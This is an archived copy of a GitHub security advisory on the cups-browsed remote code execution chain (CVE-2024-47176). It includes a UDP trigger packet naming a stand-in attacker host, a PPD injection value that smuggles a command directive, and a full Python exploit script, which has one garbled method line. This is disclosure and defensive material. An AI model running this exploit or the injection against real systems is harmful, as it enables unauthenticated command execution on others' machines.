---
url: "https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8"
title: "Multiple bugs leading to info leak and remote code execution"
site: "GitHub"
captured: "2026-11-02T18:39:26Z"
via: "live"
sha256: "f13c586d53b3e2fed4e60e2496eb7224b27470c11c9f54e7d26fbe5b2fb4bd5f"
wayback: "https://web.archive.org/web/20260917112744/https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8"
cited_in:
  - "docs/threats/07-network-exposure-and-remote-access.md"
---

# Multiple bugs leading to info leak and remote code execution

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8>
> Snapshot: <https://web.archive.org/web/20260917112744/https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8>

## Repository navigation

#  Multiple bugs leading to info leak and remote code execution

High

[zdohnal](https://github.com/zdohnal) published GHSA-rj88-6mr5-rcw8 Sep 26, 2024

## Package

cups-browsed

## Affected versions

2.0.1

## Patched versions

None

## Description

Update: The [DoS via cups-browsed's legacy CUPS browsing](https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-rq86-c7g6-r2h8) got its own CVE now: [CVE-2024-47850](https://github.com/advisories/GHSA-phc2-g348-384g)

This [DoS via cups-browsed's legacy CUPS browsing](https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-rq86-c7g6-r2h8) gets fixed by the same methods as for this advisory (stop/disable cups-browsed, turn off or remove legacy CUPS support in cups-browsed).

### Summary

Due to the service [binding to *:631 ( INADDR_ANY )](https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L13992), multiple bugs in cups-browsed can be exploited in sequence to introduce a malicious printer to the system. This chain of exploits ultimately enables an attacker to execute arbitrary commands remotely on the target machine without authentication when a print job is started. Posing a significant security risk over the network. Notably, this vulnerability is particularly concerning as [it can be exploited from the public internet](https://www.shodan.io/search?query=port%3A631+product%3A%22CUPS+%28IPP%29%22), potentially exposing a vast number of systems to remote attacks if their CUPS services are enabled.

Kernel version leak PoC by sending the UDP packet to a public facing IP address:

https://private-user-images.githubusercontent.com/86922/364836124-914c6935-8176-4df8-87e4-0406f072af64.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3OTM2NDUwNjUsIm5iZiI6MTc5MzY0NDc2NSwicGF0aCI6Ii84NjkyMi8zNjQ4MzYxMjQtOTE0YzY5MzUtODE3Ni00ZGY4LTg3ZTQtMDQwNmYwNzJhZjY0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjExMDIlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYxMTAyVDE4MzkyNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ0ZDcyZTdkMGJiNTlkOGIyZjQ4YWQ5NjZlNDI2OGU2ZWQ5YzNlY2NiNzNhMjg1MTYyYzQwOGY3YmI3ZmU5YmUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.p_HZxtEdyB3Acx9L5V19TPy0Elf0UMYFG6hcOYjVIKQ

Full remote code execution video against cups-browsed 2.0.1 on Ubuntu 24.04.1 LTS (I added a debug log of the PPD contents):

cups.mp4

### Details

Bugs:

- cups-browsed binding on *:631 and trusting any source
- [libcupsfilters -> cupsfilters/ipp.c -> cfGetPrinterAttributes5 : not sanitizing IPP attributes returned for a printer.](https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5)
- [libppd -> ppd/ppd-generator.c > ppdCreatePPDFromIPP2 : not sanitizing the attributes when creating the PPD buffer.](https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6)
- [cups-filters -> filter/foomatic-rip/foomaticrip.c : allowing any command via FoomaticRIPCommandLine.](https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47)

cups-browsed [binds to INADDR_ANY:631](https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L13992) allowing anybody to send UDP datagrams to it. Moreover, the default configuration on most GNU/Linux distributions is extremely permissive and allows the specific UDP packet for this PoC. Specifically this has been tested against Ubuntu 24.04.1 LTS.

#### Step 1:

An attacker starts a malicious IPP server and then sends a first UDP packet to the target machine:

0 3 http://<ATACKER-IP>:<PORT>/printers/whatever

This will make the target machine connect back (and disclose the kernel and CUPS version in the User-Agent header) to an attacker controlled IPP server.

#### Step 2:

This causes the victim machine to connect to the attacker controlled IPP server and [request its attributes](https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L7828). The server responds with a list of valid attributes additionally to a last attribute used for injection ([similarly to other vulnerabilities](https://issuetracker.google.com/issues/172222838)):

```
# ... other valid attributes ...
(
    SectionEnum.printer,
    b'printer-privacy-policy-uri',
    TagEnum.uri
): [b'https://www.google.com/"\n*FoomaticRIPCommandLine: "' +
    self.command.encode() +
    b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],
```

This will:

- Perform double quote+newline injection of custom PPD directives into the temporary PPD file. (bug: the strings from attributes should be escaped)
- Bypass [these checks](https://github.com/OpenPrinting/cups-browsed/blob/master/daemon/cups-browsed.c#L8939). (bug: the space added before the colon is enough to bypass the strncmp based checks)

Resulting in the following PPD:

```
...
*cupsSNMPSupplies: False
*cupsLanguages: "en"
*cupsPrivacyURI: "https://www.google.com/"
*FoomaticRIPCommandLine: "echo 1 > /tmp/I_AM_VULNERABLE"
*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
*cupsSingleFile: True
*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 -"
...

```

This PPD will cause the echo 1 > /tmp/I_AM_VULNERABLE command to be executed on the target machine when a print job is sent to fake printer. This happens because the foomatic-rip filter will [interpolate and execute](https://github.com/OpenPrinting/cups-filters/blob/5a73330fbd0cde494d984141f9add1565aef8171/filter/foomatic-rip/options.c#L1958) FoomaticRIPCommandLine from the PPD.

### PoC

Uses the [ippserver package](https://github.com/h2g2bob/ipp-server), run as exploit.py ATTACKER_EXTERNAL_IP TARGET_IP, will create the /tmp/I_AM_VULNERABLE file on the target machine when a print job is started:

```
#!/usr/bin/env python3
import socket
import threading
import time
import sys

from ippserver.server import IPPServer
import ippserver.behaviour as behaviour
from ippserver.server import IPPRequestHandler
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest

class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [b'Main Printer'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Main Printer Info'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [b'HP 0.00'],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()],  # XXX 3 is idle
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1'],
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,  # (required by cups)
                    OperationEnum.validate_job,  # (required by cups)
                    OperationEnum.cancel_job,  # (required by cups)
                    OperationEnum.get_job_attributes,  # (required by cups)
                    OperationEnum.get_printer_attributes,
                )],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [Integer(666).bytes()],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-privacy-policy-uri',
                TagEnum.uri
            ): [b'https://www.google.com/"\n*FoomaticRIPCommandLine: "' +
                self.command.encode() +
                b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],

        }
        attr.update(super().minimal_attributes())
        return attr

    def ](self, req, _psfile):
        print("target connected, sending payload ...")
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes)

def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    print("sending udp packet to %s:%d ..." % (ip, port))

    printer_type = 0x00
    printer_state = 0x03
    printer_uri = 'http://%s:%d/printers/NAME' % (
        ipp_server_host, ipp_server_port)
    printer_location = 'Office HQ'
    printer_info = 'Printer'

    message = bytes('%x %x %s "%s" "%s"' %
                    (printer_type,
                     printer_state,
                     printer_uri,
                     printer_location,
                     printer_info), 'UTF-8')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (ip, port))

def wait_until_ctrl_c():
    try:
        while True:
            time.sleep(300)
    except KeyboardInterrupt:
        return

def run_server(server):
    print('malicious ipp server listening on ', server.server_address)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    wait_until_ctrl_c()
    server.shutdown()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("%s <LOCAL_HOST> <TARGET_HOST>" % sys.argv[0])
        quit()

    SERVER_HOST = sys.argv[1]
    SERVER_PORT = 12345

    command = "echo 1 > /tmp/I_AM_VULNERABLE"

    server = IPPServer((SERVER_HOST, SERVER_PORT),
                       IPPRequestHandler, MaliciousPrinter(command))

    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    TARGET_HOST = sys.argv[2]
    TARGET_PORT = 631
    send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)

    print("wating ...")

    while True:
        time.sleep(1.0)
```

Then send a print job to the new printer in the target machine.

### Impact

Remote code execution as cups (lp) user.

### Severity

High

### CVE ID

CVE-2024-47176

### Weaknesses

Weakness CWE-20

####   [Improper Input Validation](https://github.com/advisories?query=cwe%3A20)

The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.  [Learn more on MITRE.](https://cwe.mitre.org/data/definitions/20.html)

Weakness CWE-749

####   [Exposed Dangerous Method or Function](https://github.com/advisories?query=cwe%3A749)

The product provides an Applications Programming Interface (API) or similar interface for interaction with external actors, but the interface includes a dangerous method or function that is not properly restricted.  [Learn more on MITRE.](https://cwe.mitre.org/data/definitions/749.html)

Weakness CWE-1327

####   [Binding to an Unrestricted IP Address](https://github.com/advisories?query=cwe%3A1327)

The product assigns the address 0.0.0.0 for a database server, a cloud service/instance, or any computing resource that communicates remotely.  [Learn more on MITRE.](https://cwe.mitre.org/data/definitions/1327.html)

### Credits

-   https://github.com/evilsocket [evilsocket](https://github.com/evilsocket)   Reporter
